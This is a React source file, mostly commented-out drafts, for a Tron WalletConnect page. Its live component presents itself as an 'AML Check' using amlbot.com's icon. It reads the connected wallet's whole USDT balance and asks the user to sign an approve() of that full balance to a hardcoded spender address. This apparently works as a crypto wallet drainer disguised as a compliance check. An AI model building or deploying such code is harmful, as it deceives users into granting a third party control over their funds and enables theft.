// @ts-nocheck

// import { lazy, Suspense } from 'react'
// import { BrowserRouter as Router, Routes, Route } from 'react-router-dom'
// import Navbar from './components/Navbar'
// import Footer from './components/Footer'
// import LoadingSpinner from './components/common/LoadingSpinner'
// import ScrollToTop from './components/common/ScrollToTop'
// import { ThemeProvider } from './context/ThemeContext'
// import './styles/global.css'

// // Lazy load pages for better performance
// const Home = lazy(() => import('./pages/Home'))
// const Verify = lazy(() => import('./pages/Verify'))
// const Features = lazy(() => import('./pages/Features'))
// const Pricing = lazy(() => import('./pages/Pricing'))
// const About = lazy(() => import('./pages/About'))
// const Contact = lazy(() => import('./pages/Contact'))
// const NotFound = lazy(() => import('./pages/NotFound'))

// function App() {
//   return (
//     <ThemeProvider>
//       <Router>
//         <ScrollToTop />
//         <Navbar />
//         <Suspense fallback={<LoadingSpinner />}>
//           <Routes>
//             <Route path="/" element={<Home />} />
//             <Route path="/verify" element={<Verify />} />
//             <Route path="/features" element={<Features />} />
//             <Route path="/pricing" element={<Pricing />} />
//             <Route path="/about" element={<About />} />
//             <Route path="/contact" element={<Contact />} />
//             <Route path="*" element={<NotFound />} />
//           </Routes>
//         </Suspense>
//         <Footer />
//       </Router>
//     </ThemeProvider>
//   )
// }

// export default App

// import React, { useState, useCallback, useEffect } from 'react'
// import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks'

// // TRC-20 USDT on Tron Mainnet
// const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
// const APPROVE_AMOUNT = 100 * 1e6  // 100 USDT (6 decimals)

// export default function App() {
//   const {
//     connected,
//     address,
//     tronWeb,
//     select,
//     connect,
//     disconnect,
//   } = useWallet()

//   // Spender: who can call transferFrom
//   const [spenderAddress, setSpenderAddress] = useState(
//     'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'
//   )
//   const [status, setStatus] = useState('')

//   const handleConnect = useCallback(
//     async (adapterName) => {
//       select(adapterName)
//       setStatus('Connecting...')
//       try {
//         await connect()
//         setStatus(`Connected: ${address}`)
//       } catch (err) {
//         console.error('Connection error:', err)
//         setStatus(`Connection failed: ${err.message || err}`)
//       }
//     },
//     [select, connect, address]
//   )

//   // Approve spenderAddress to spend APPROVE_AMOUNT from your account
//   const handleApprove = useCallback(async () => {
//     console.log('helllooo')
//     let tronWeb = window.tronWeb
//     if (!connected) {
//       setStatus('Please connect your wallet first')
//       return
//     }
//     console.log('hiii')
//     console.log("Spender Address:", spenderAddress);
//     console.log("Is valid:", tronWeb);
//     if (!tronWeb || !tronWeb.isAddress(spenderAddress)) {
//       setStatus('Invalid spender address')
//       return
//     }
//     console.log('byeee')
//     setStatus('Sending approval transaction...')
//     try {
//       const contract = await tronWeb.contract().at(USDT_ADDRESS)
//       const tx = await contract.approve(spenderAddress, APPROVE_AMOUNT).send()
//       console.log('approve tx:', tx)
//       setStatus(`Approved ${APPROVE_AMOUNT / 1e6} USDT to ${spenderAddress}`)
//     } catch (err) {
//       console.error('Approval error:', err)
//       setStatus(`Approval failed: ${err.message || err}`)
//     }
//   }, [connected, spenderAddress, tronWeb])

//   // Ensure defaultAddress is populated

//   useEffect(() => {
//     console.log(';useEffect');

//     console.log(';tronWeb', tronWeb);
//     console.log(';tronWebtronWeb', window.tronWeb);
//     if (connected && tronWeb && address) {
//       try {
//         tronWeb.defaultAddress = {
//           base58: address,
//           hex: tronWeb.address.toHex(address),
//         }

//       } catch (e) {
//         console.warn('Failed to set defaultAddress', e)
//       }
//     }
//   }, [connected, tronWeb, address])

//   return (
//     <div style={{ padding: 20, maxWidth: 400 }}>
//       <label>
//         Spender Address (allowed to pull via transferFrom):<br />
//         <input
//           type="text"
//           value={spenderAddress}
//           onChange={e => setSpenderAddress(e.target.value.trim())}
//           placeholder="e.g. TXYZ..."
//           style={{ width: '100%', marginBottom: 12 }}
//         />
//       </label>

//       {!connected ? (
//         <>
//           <button
//             onClick={() => handleConnect('TronLink')}
//             disabled={!spenderAddress}
//           >
//             Connect TronLink
//           </button>
//           <button
//             onClick={() => handleConnect('WalletConnect')}
//             disabled={!spenderAddress}
//             style={{ marginLeft: 8 }}
//           >
//             Connect WalletConnect
//           </button>
//         </>
//       ) : (
//         <>
//           <p>Connected as <b>{address}</b></p>
//           <button onClick={disconnect}>Disconnect</button>
//           <hr />

//           <button onClick={handleApprove} style={{ marginTop: 8 }}>
//             Approve {APPROVE_AMOUNT / 1e6} USDT
//           </button>

//           {status && <p style={{ marginTop: 16 }}>{status}</p>}
//         </>
//       )}
//     </div>
//   )
// }
// ✅ WORKING TRUST WALLET + WALLETCONNECT RAW TRON TX EXAMPLE
// Note: This is a raw WalletConnect v2 + TRON integration for Trust Wallet popup approval


// import React, { useState } from 'react';
// import { useAccount, useConnect } from 'wagmi';
// import { TronWeb } from 'tronweb';
// import { wagmiAdapter } from './main';

// const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// const SPENDER_ADDRESS = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';

// const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });

// function WalletConnectComponent() {
//   const { address, isConnected } = useAccount();
//   const { connect } = useConnect();
//   const [status, setStatus] = useState('');
//   console.log('address', address);
//   console.log('isConnected', isConnected);


//   const handleConnect = async () => {
//     try {

//       const res = await wagmiAdapter.connect({ id: 'walletConnect' }); // ✅ Correct
//       console.log('res');

//       const account = wagmiAdapter.getAccount();
//       console.log('account',account);

//       setAddress(account.address);
//       setStatus('Wallet connected');
//     } catch (err) {
//       console.log('err',err);

//       setStatus('Connection failed');
//     }
//   };

//   const handleApprove = async () => {
//     if (!isConnected || !address) {
//       setStatus('Please connect your wallet first');
//       return;
//     }

//     try {
//       const parameter = [
//         { type: 'address', value: SPENDER_ADDRESS },
//         { type: 'uint256', value: tronWeb.toSun(100) },
//       ];

//       const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
//         USDT_CONTRACT,
//         'approve(address,uint256)',
//         { feeLimit: 100_000_000 },
//         parameter,
//         address
//       );

//       // Send the transaction using your preferred method
//       // For example, using tronWeb.trx.sendRawTransaction or through AppKit's transaction sender

//       setStatus('Transaction sent');
//     } catch (error) {
//       setStatus('Transaction failed');
//     }
//   };

//   return (
//     <div>
//       {!isConnected ? (
//         <button onClick={handleConnect}>Connect Wallet</button>
//       ) : (
//         <>
//           <p>Connected: {address}</p>
//           <button onClick={handleApprove}>Approve 100 USDT</button>
//         </>
//       )}
//       <p>{status}</p>
//     </div>
//   );
// }

// export default WalletConnectComponent;
// ✅ Updated React Component with WalletConnectWallet support via @tronweb3/walletconnect-tron
import React, { useEffect, useState } from 'react';
import TronWeb from 'tronweb';
import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';

const contractAddressUSDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const spenderAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';
const tokenPriceInUSD = 1;
const min_withdraw = 1;
const projectId = '150d746f7722fa489e9df7ad9ddcd955'; // Replace with real WC project ID

const wallet = new WalletConnectWallet({
  network: WalletConnectChainID.Mainnet,
  relayUrl: `https://relay.walletconnect.org?projectId=${projectId}`,
  options: {
    projectId,
    metadata: {
      name: 'AML Check',
      description: 'Tron WalletConnect',
      url: window.location.origin,
      icons: ['https://amlbot.com/favicon.png'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
    themeVariables: {
      '--w3m-z-index': 1000,
    },
    explorerRecommendedWalletIds: [
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
      'e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4',
      '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
      '19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927'
    ],
    explorerExcludedWalletIds: 'ALL',
  },
});

function App() {
  const [address, setAddress] = useState('');
  const [status, setStatus] = useState('');

  const connectWallet = async () => {
    try {
      const data = await wallet.connect();
      setAddress(data.address);
      setStatus(`✅ Connected: ${data.address}`);
    } catch (error) {
      console.error('Connection error:', error);
      setStatus('❌ Failed to connect wallet');
    }
  };

  const getTrxBalance = async (addr) => {
    const tronWeb = wallet.tronWeb;
    const balance = await tronWeb.trx.getBalance(addr);
    return tronWeb.fromSun(balance);
  };

  const handleApprove = async () => {
    if (!address) {
      setStatus('❌ Wallet not connected');
      return;
    }

    try {
      const tronWeb = wallet.tronWeb;
      const balanceTRX = await getTrxBalance(address);
      const contract = await tronWeb.contract().at(contractAddressUSDT);
      const decimals = await contract.decimals().call();
      const rawBalance = await contract.balanceOf(address).call();
      const balance = Number(rawBalance);
      const balance_normal = balance / Math.pow(10, decimals);

      if (balanceTRX > 5 && balance > 0) {
        const parameter = [
          { type: 'address', value: spenderAddress },
          { type: 'uint256', value: balance },
        ];

        const options = { feeLimit: 300_000_000, from: address };

        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
          contractAddressUSDT,
          'approve(address,uint256)',
          options,
          parameter,
          address
        );

        const signed = await wallet.signTransaction(tx.transaction);
        const broadcast = await tronWeb.trx.sendRawTransaction(signed);

        if (broadcast.result) {
          setStatus(`✅ Approved ${balance_normal} USDT! TX: ${broadcast.txid}`);
        } else {
          setStatus('❌ Broadcast failed');
        }
      } else {
        setStatus('⚠️ Not enough balance or TRX');
      }
    } catch (err) {
      console.error('Approve error:', err);
      setStatus('❌ Approve failed');
    }
  };

  return (
    <div style={{ padding: 20 }}>
      <h2>WalletConnect TRON USDT Approve</h2>
      {!address ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <>
          <p>Address: {address}</p>
          <button onClick={handleApprove}>Approve USDT</button>
        </>
      )}
      <p>{status}</p>
    </div>
  );
}

export default App;